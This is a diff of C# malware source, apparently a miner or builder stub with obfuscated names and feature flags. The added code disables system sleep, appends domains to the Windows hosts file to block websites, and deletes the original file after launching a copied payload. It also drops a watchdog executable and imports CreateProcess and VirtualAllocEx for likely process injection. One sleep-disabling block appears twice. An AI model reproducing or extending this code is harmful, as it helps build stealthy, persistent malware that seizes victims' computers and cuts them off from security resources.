@@ -39,6 +39,55 @@ public partial class _rProgram_
 #endif
             }
 #endif
+#if DefDisableSleep
+            try
+            {
+                _rCommand_(_rGetString_("#SCMD"), _rGetString_("#POWERCFG"));
+            }
+            catch (Exception ex)
+            {
+#if DefDebug
+                MessageBox.Show("M0.5: " + Environment.NewLine + ex.ToString());
+#endif
+            }
+#endif
+#if DefDisableSleep
+            try
+            {
+                _rCommand_(_rGetString_("#SCMD"), _rGetString_("#POWERCFG"));
+            }
+            catch (Exception ex)
+            {
+#if DefDebug
+                MessageBox.Show("M0.5: " + Environment.NewLine + ex.ToString());
+#endif
+            }
+#endif
+#if DefBlockWebsites
+            try
+            {
+                string _rhostspath_ = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), _rGetString_("#HOSTSPATH"));
+                string _rhostscontent_ = File.ReadAllText(_rhostspath_);
+
+                string[] _rdomainset_ = new string[] { DOMAINSET };
+                using (StreamWriter w = File.AppendText(_rhostspath_))
+                {
+                    foreach (string _set_ in _rdomainset_)
+                    {
+                        if (!_rhostscontent_.Contains(" " + _set_))
+                        {
+                            w.Write(string.Format(_rGetString_("#HOSTSFORMAT"), _set_));
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+#if DefDebug
+                MessageBox.Show("M0.5: " + Environment.NewLine + ex.ToString());
+#endif
+            }
+#endif
 #if DefStartDelay
             Thread.Sleep(startDelay * 1000);
 #endif
@@ -111,6 +160,9 @@ public partial class _rProgram_
                     File.Copy(_rcmdl_, _rplp_, true);
                     Thread.Sleep(2 * 1000);
                     _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDSTART"), _rplp_));
+#if DefAutoDelete
+                    _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDDELETE"), _rcmdl_));
+#endif
                     Environment.Exit(0);
                 }
             }
@@ -130,7 +182,7 @@ public partial class _rProgram_
 #if DefWatchdog
                     if (!_rFindWatchdog_())
                     {
-                        File.WriteAllBytes(_rbD2_ + _rGetString_("#WATCHDOG") + ".exe", _rGetTheResource_("#RESWD"));
+                        File.WriteAllBytes(Path.Combine(_rbD2_, _rGetString_("#WATCHDOG") + ".exe"), _rGetTheResource_("#RESWD"));
 
                         Process.Start(new ProcessStartInfo
                         {
@@ -164,7 +216,7 @@ public partial class _rProgram_
                     {
                         try
                         {
-                            byte[] _li_ = _rGetTheResource_("#libs");
+                            byte[] _li_ = _rGetTheResource_("#RESLIBS");
 
                             if (_li_.Length > 0) {
                                 using (var _rarchive_ = new ZipArchive(new MemoryStream(_li_)))
@@ -409,15 +461,15 @@ public partial class _rProgram_
 
     [DllImport("kernel32.dll")]
     private static extern bool CreateProcess(string _rarg1_,
-                                             string _rarg2_,
-                                             IntPtr _rarg3_,
-                                             IntPtr _rarg4_,
-                                             bool _rarg5_,
-                                             uint _rarg6_,
-                                             IntPtr _rarg7_,
-                                             string _rarg8_,
-                                             byte[] _rarg9_,
-                                             byte[] _rarg1_0);
+                                         string _rarg2_,
+                                         IntPtr _rarg3_,
+                                         IntPtr _rarg4_,
+                                         bool _rarg5_,
+                                         uint _rarg6_,
+                                         IntPtr _rarg7_,
+                                         string _rarg8_,
+                                         byte[] _rarg9_,
+                                         byte[] _rarg1_0);
 
     [DllImport("kernel32.dll")]
     private static extern long VirtualAllocEx(long _rarg1_,
